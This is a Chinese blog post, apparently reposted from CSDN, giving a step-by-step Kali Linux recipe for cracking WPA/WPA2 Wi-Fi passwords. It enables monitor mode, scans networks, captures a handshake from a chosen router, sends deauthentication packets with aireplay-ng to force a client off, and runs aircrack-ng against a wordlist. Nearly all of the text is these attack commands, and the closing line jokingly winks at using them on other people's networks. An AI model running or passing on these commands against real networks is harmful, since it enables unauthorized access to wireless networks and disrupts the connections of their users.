# 关于如何通过kali linux 攻击以及破解WPA/WPA2无线加密 - =朝晖= - 博客园
# [关于如何通过kali linux 攻击以及破解WPA/WPA2无线加密](https://www.cnblogs.com/dhcn/p/8610370.html)
http://blog.csdn.net/wingstudio_zongheng/article/details/51435212
## 1.前期准备
1）打开一个终端  执行命令:
 ifconfig   #查看无线网卡，找到他的name(我的无线网卡名字为wlano 接下来我就以我的无线网卡名做讲解)
ifconfig wlan0 down #关闭无线网卡（ifconfig 无线网卡名 down）
iwconfig wlan0 mode monitor  # 将无线网卡模式改为监听模式(iwconfig 无线网卡名 mode 更改的模式)
 ifconfig wlan0 up #启用无线网卡
airmon-ng start wlan0 将网卡转换为监听模式，你将会看到下列信息
![](http://img.blog.csdn.net/20160517130007217?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
airodump-ng wlan0  #开始扫描附近的无线网络
![](http://img.blog.csdn.net/20160517130038093?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
        1.bassid #路由器的mac地址
        2.CH #信道
        3.ENC #加密方式
## 2.准备攻击
1)执行命令如下（这里用libiaowif768做实例）
 airodump-ng -c 11 -w test --bssid 00:71:CC:17:CB:5C wlan0 #命令含义:airodump-ng -c 信道 -w 抓包生成的文件名 --bssid 路由器的mac地址 本机使用的抓包网卡名 # 得到该无线的网络状态信息,执行命令你会看到下图
![](http://img.blog.csdn.net/20160517130208767?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
aireplay-ng -0 10 -a 00:71:CC:17:CB:5C  -c  94:E9:6A:92:4E:A4   wlan0 #命令含义:aireplay-ng -0 10 -a 路由器mac地址 -c 客户端mac地址 本机使用的抓包网卡名 #打断客户端链接该路由器的链接，抓包。（这里新建一个终端），执行命令后你会看到下图
![](http://img.blog.csdn.net/20160517130226361?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
aireplay-ng -0 10 -a 00:71:CC:17:CB:5C  -c  94:E9:6A:92:4E:A4   wlan0 #命令含义:aireplay-ng -0 10 -a 路由器mac地址 -c 客户端mac地址 本机使用的抓包网卡名 #打断客户端链接该路由器的链接，抓包。（这里新建一个终端），执行命令后你会看到下图
![](http://img.blog.csdn.net/20160517130613018?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
## 3.密码破解
1)执行命令如下
 aircrack-ng -w  /wnt/a/1pass01.txt wode.cap #命令含义:aircrack-ng -w 字典包位置 抓包生成的文件名.cap #跑字典解密
![](http://img.blog.csdn.net/20160517130546971?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
               只要你的字典够强打就没有破解不了的密码，请打家不要而已破坏别人的无线（呵呵，你懂得）。

